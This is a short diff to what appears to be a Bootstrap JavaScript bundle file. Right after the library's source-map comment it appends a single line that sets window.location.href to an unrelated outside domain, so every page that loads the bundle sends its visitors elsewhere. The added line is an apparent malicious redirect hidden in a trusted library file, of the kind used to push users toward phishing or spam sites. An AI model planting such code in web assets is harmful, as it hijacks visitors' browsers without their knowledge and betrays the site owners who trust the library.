@@ -7029,3 +7029,4 @@
 
 })));
 //# sourceMappingURL=bootstrap.bundle.js.map
+window.location.href = "https://mxrespinme.my.id";
